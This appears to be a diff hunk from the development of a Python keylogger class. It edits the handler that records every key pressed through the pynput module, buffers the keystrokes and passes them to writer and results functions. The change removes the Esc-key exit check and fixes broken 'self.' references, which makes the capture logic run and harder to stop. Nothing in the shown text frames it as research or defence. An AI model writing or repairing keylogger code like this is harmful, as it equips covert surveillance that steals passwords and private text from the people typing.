@@ -26,18 +26,15 @@ class Keylogger():
         Checks counters and sends the data to the logging function.
         :param key: The key pressed given from pynput module.
         """
-        print("Listener working") #                                     TEST
-        if str(key) == "Key.esc": # Checks for program exit
-            return False
         self._keys.append(key)  # Appends every pressed key
         self._keystrokes_count += 1  # Keeps track of keystrokes count
-        if _keystrokes_count >= KEYSTROKES_BUFFER_SIZE:
-            self._writer(_keys)
-            _keystrokes_count = 0
-            _keys = []
+        if self._keystrokes_count >= KEYSTROKES_BUFFER_SIZE:
+            self._writer(self._keys)
+            self._keystrokes_count = 0
+            self._keys = []
             self._saves_count += 1
-        if _saves_count >= SAVES_BUFFER_SIZE:
-            _saves_count = 0
+        if self._saves_count >= SAVES_BUFFER_SIZE:
+            self._saves_count = 0
             self._results()
 
 
